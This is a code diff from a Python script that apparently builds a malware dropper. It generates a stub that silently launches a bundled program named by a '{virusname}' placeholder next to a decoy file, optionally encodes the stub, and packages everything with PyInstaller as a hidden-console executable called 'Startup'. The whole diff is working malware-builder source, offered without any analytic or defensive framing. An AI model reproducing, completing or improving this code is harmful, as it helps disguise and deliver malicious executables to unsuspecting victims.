@@ -22,11 +22,13 @@ import time
 def run_hidden_program(exe_name):
     try:
         exe_path = os.path.join(sys._MEIPASS, exe_name)
-        subprocess.Popen(exe_path, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        os.startfile(exe_path)
+        print(exe_path)
     except:
-    time.sleep(1)
+        time.sleep(1)
         exe_path = os.path.join(sys._MEIPASS, exe_name)
-        subprocess.Popen(exe_path, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        os.startfile(exe_path)
+        
 
         
 run_hidden_program('{virusname}')
@@ -39,7 +41,11 @@ run_hidden_program('{file}')
 if n == 0 or n == "":
     pass
 else:
-    code = encode(n,code)
+    with open("code.py" , "w") as f:
+        f.write(code)
+        f.close()
+    code = encode(n)
+
 
 
 with open("code.py","w") as f:
@@ -48,8 +54,8 @@ with open("code.py","w") as f:
 
 
 PyInstaller.__main__.run([
-    '--onefile',   
-    '--noconsole',     
+    '--onefile',        
+    '--noconsole',
     '--name=Startup',  
     f'--add-data={virusname};.', 
     f'--add-data={file};.', 
